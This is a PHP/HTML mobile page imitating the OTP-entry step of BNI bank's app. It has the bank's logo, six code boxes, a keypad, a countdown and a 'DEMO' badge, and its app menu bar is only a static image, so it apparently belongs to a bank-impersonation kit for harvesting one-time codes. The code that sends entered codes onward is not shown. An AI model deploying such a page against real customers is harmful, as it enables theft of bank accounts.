<?php
?>
<html>
    <head>
        <title>BNI</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="assets/common/css/global.css">
        <link rel="stylesheet" href="assets/common/css/otp.css">
        <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
        <link rel="stylesheet" href="assets/lib/jquery-ui/jquery-ui.css">
        <script>
            const module = {};
        </script>
        <script src="assets/common/js/jquery.js"></script>
        <script type="module" src="assets/common/js/otp.js"></script>
        <script type="module" src="assets/lib/jquery-ui/jquery-ui.js"></script>
        <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
    </head>
    <body>
        <div style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; background-color: #e3e8eb;">
            <div style="width: 100%; display: flex; flex-direction: column; background-color: #ff7f08;">
                <div style="width: calc(100% - 20px); display: flex; flex-direction: row; justify-content: space-between; align-items: center; margin-left: 10px; margin-right: 10px; margin-top: 10px;">
                    <img src="assets/common/img/bni_logo.png" width="100px" height="50px">
                    <div style="color: #ffffff; font-size: 15px; font-weight: bold;">OTP</div>
                    <div style="width: 100px; height: 50px;"></div>
                </div>
                <div style="width: 100%; height: 4px; background-color: #ffffff; display: flex; flex-direction; row; justify-content: flex-end; margin-bottom: 10px; margin-top: 10px;">
                    <div style="width: 60%; height: 100%; background-color: #27a3a6;"></div>
                </div>
                <div style="display: flex; flex-direction: row; justify-content: center; align-items: center; margin-top: 10px; margin-bottom: 10px;">
                    <div style="width: 36px; height: 36px; display: flex; justify-content: center; align-items: center; background-color: #005d69; border-radius: 18px; color: #ffffff; font-size: 15px; font-weight: bold;">
                        1
                    </div>
                    <div style="width: 10px; height: 1px; margin-left: 5px; margin-right: 5px; background-color: #005d69;"></div>
                    <div style="width: 36px; height: 36px; display: flex; justify-content: center; align-items: center; background-color: #005d69; border-radius: 18px; color: #ffffff; font-size: 15px; font-weight: bold;">
                        2
                    </div>
                    <div style="width: 10px; height: 1px; margin-left: 5px; margin-right: 5px; background-color: #005d69;"></div>
                    <div style="width: 36px; height: 36px; display: flex; justify-content: center; align-items: center; background-color: #005d69; border-radius: 18px; color: #ffffff; font-size: 15px; font-weight: bold;">
                        3
                    </div>
                    <div style="width: 10px; height: 1px; margin-left: 5px; margin-right: 5px; background-color: #939397;"></div>
                    <div style="width: 36px; height: 36px; display: flex; justify-content: center; align-items: center; background-color: #939397; border-radius: 18px; color: #ffffff; font-size: 15px; font-weight: bold;">
                        4
                    </div>
                    <div style="width: 10px; height: 1px; margin-left: 5px; margin-right: 5px; background-color: #939397;"></div>
                    <div style="width: 36px; height: 36px; display: flex; justify-content: center; align-items: center; background-color: #939397; border-radius: 18px; color: #ffffff; font-size: 15px; font-weight: bold;">
                        5
                    </div>
                </div>
            </div>
            <div style="width: 100%; position: relative;">
            <div style="width: 100%; flex: 1; display: flex; flex-direction: column; align-items: center; overflow: scroll;">
                <div style="color: #4a4e5b; font-size: 15px; font-weight: bold; margin-top: 10px;">Masukkan Kode OTP</div>
                <div style="color: #1b545d; font-size: 15px; font-weight: bold; margin-top: 5px;">Yang dikirim ke nomor <span id="phone"></span></div>
                <div style="display: flex; flex-direction: row; align-items: center; margin-left: 30px; margin-right: 30px; margin-top: 20px;">
                    <div style="width: 40px; height: 40px; border: 2px solid #cccccc; border-radius: 8px;">
                        <input id="num1" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center;">
                    </div>
                    <div style="width: 40px; height: 40px; border: 2px solid #cccccc; border-radius: 8px; margin-left: 10px;">
                        <input id="num2" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center;">
                    </div>
                    <div style="width: 40px; height: 40px; border: 2px solid #cccccc; border-radius: 8px; margin-left: 10px;">
                        <input id="num3" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center;">
                    </div>
                    <div style="width: 40px; height: 40px; border: 2px solid #cccccc; border-radius: 8px;  margin-left: 10px;">
                        <input id="num4" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center;">
                    </div>
                    <div style="width: 40px; height: 40px; border: 2px solid #cccccc; border-radius: 8px; margin-left: 10px;">
                        <input id="num5" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center;">
                    </div>
                    <div style="width: 40px; height: 40px; border: 2px solid #cccccc; border-radius: 8px; margin-left: 10px;">
                        <input id="num6" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center;">
                    </div>
                </div>
                <div id="timeout-container" style="color: #1b545dac; font-size: 20px; font-weight: bold; margin-top: 30px;">( 60 detik )</div>
                <div id="expired-otp" style="color: #ff0000; font-size: 13px; margin-left: 30px; margin-right: 30px; font-weight: bold; text-align: center; margin-top: 30px; display: none;" onclick="module.resendOTPCode()">Kode OTP telah kadaluwarsa, klik untuk mengirim ulang</div>
                <div style="display: flex; flex-direction: row; margin-left: 30px; margin-right: 30px; margin-top: 10px;">
                    <ion-icon name="information-circle-outline" style="color: #1b545d; font-size: 30px;"></ion-icon>
                    <div style="color: #1b545d; font-size: 13px; font-weight: bold; margin-left: 5px;">Pastikan nomor Anda memiliki pulsa untuk menerima Kode OTP SMS</div>
                </div>
                <div style="width: calc(100% - 40px); display: flex; flex-direction: row; align-items: center; margin-top: 10px; margin-left: 20px; margin-right: 20px;">
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(1)">
                    1
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(2)">
                    2
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(3)">
                    3
                    </div>
                </div>
                <div style="width: calc(100% - 40px); display: flex; flex-direction: row; align-items: center; margin-left: 20px; margin-right: 20px;">
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(4)">
                    4
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(5)">
                    5
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(6)">
                    6
                    </div>
                </div>
                <div style="width: calc(100% - 40px); display: flex; flex-direction: row; align-items: center; margin-left: 20px; margin-right: 20px;">
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(7)">
                    7
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(8)">
                    8
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(9)">
                    9
                    </div>
                </div>
                <div style="width: calc(100% - 40px); display: flex; flex-direction: row; align-items: center; margin-left: 20px; margin-right: 20px;">
                    <div style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;">
                    
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 40px; color: #1b545d;" onclick="module.type(0)">
                    0
                    </div>
                    <div class="ripple" style="flex: 1; height: 80px; display: flex; justify-content: center; align-items: center;" onclick="module.deleteNum()">
                      <ion-icon name="backspace" style="color: #1b545d; font-size: 30px;"></ion-icon>
                    </div>
                </div>
                <div style="margin-bottom: 200px;"></div>
            </div>
            <div id="loader" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; display: none; flex-direction: column; justify-content: center; align-items: center;">
                <div style="width: calc(100% - 40px); height: 200px; border-radius: 10px; background-color: #ffffff; display: flex; justify-content: center; align-items: center;">
                    <span class="loader"></span>
                </div>
            </div>
            </div>
            <img src="assets/common/img/bottom_menu.png" width="100%" height="100px" style="position: fixed; left: 0; bottom: 0; object-fit: fill;">
            <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; color: #ffffff; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px; font-weight: bold; font-size: 20px;">
                DEMO
            </div>
        </div>
    </body>
</html>